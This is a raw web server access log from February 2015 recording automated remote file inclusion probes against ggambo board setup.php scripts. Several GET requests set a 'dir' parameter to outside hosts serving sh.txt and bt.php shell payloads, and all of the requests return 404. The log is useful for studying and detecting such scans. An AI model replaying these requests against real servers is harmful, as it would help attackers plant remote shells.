80.68.145.110 - - [14/Feb/2015:12:44:09 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
80.68.145.110 - - [14/Feb/2015:12:44:10 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
1.224.163.80 - - [14/Feb/2015:12:45:35 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
1.224.163.80 - - [14/Feb/2015:12:45:37 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
1.224.163.80 - - [14/Feb/2015:12:45:37 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
1.224.163.80 - - [14/Feb/2015:12:45:38 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
181.65.186.35 - - [14/Feb/2015:12:46:03 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [14/Feb/2015:12:46:04 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [14/Feb/2015:12:46:04 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [14/Feb/2015:12:46:05 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [14/Feb/2015:12:46:05 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [14/Feb/2015:12:46:06 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [14/Feb/2015:12:46:07 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
181.65.186.35 - - [14/Feb/2015:12:46:08 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
49.50.76.8 - - [14/Feb/2015:12:46:18 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
49.50.76.8 - - [14/Feb/2015:12:46:20 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
